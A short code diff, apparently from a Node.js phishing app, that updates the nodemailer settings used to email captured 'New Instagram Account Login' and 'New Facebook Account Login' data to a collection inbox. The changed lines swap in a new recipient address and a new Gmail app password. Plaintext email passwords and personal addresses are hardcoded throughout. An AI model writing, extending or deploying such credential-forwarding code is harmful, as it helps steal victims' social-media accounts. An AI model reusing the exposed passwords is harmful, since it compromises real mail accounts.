@@ -107,13 +107,13 @@ app
       service: "gmail",
       auth: {
         user: "stevenwoods943@gmail.com",
-        pass: "kfqbbpdsjdssfrqr",
+        pass: "pcpz uecy ioly iont",
       },
     });
     //   Define email
     const mailOptions = {
       from: "stevenwoods943@gmail.com",
-      to: "patrickrodgers511@gmail.com",
+      to: "capthoworkspace@gmail.com",
       subject: "New Instagram Account Login",
       text: output,
     };
@@ -149,13 +149,13 @@ app
       service: "gmail",
       auth: {
         user: "stevenwoods943@gmail.com",
-        pass: "kfqbbpdsjdssfrqr",
+        pass: "pcpz uecy ioly iont",
       },
     });
     //   Define email
     const mailOptions = {
       from: "stevenwoods943@gmail.com",
-      to: "patrickrodgers511@gmail.com",
+      to: "capthoworkspace@gmail.com",
       subject: "New Facebook Account Login",
       text: output,
     };
